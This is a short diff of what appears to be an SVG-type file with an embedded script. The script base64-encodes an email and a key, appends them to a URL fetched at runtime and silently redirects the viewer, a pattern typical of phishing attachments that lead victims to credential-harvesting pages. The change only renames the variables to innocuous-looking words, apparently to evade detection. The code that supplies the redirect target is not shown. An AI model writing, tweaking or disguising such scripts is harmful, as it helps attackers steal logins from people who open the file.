@@ -5,7 +5,7 @@
   </metadata>
   <script type="application/ecmascript">
     <![CDATA[
-let a1="[EMAIL]",b2="[KEY]";
+let due="[EMAIL]",past="[KEY]"; 
 (function(){
   console.log("good");
   
@@ -42,7 +42,7 @@ let a1="[EMAIL]",b2="[KEY]";
     }
 
     async function g() {
-      let r = btoa(`${a1}&${b2}&a}`);
+      let r = btoa(`${due}&${past}&a}`);
       let t = await f();
       window.open(`${t}${r}`, "_self");
     }
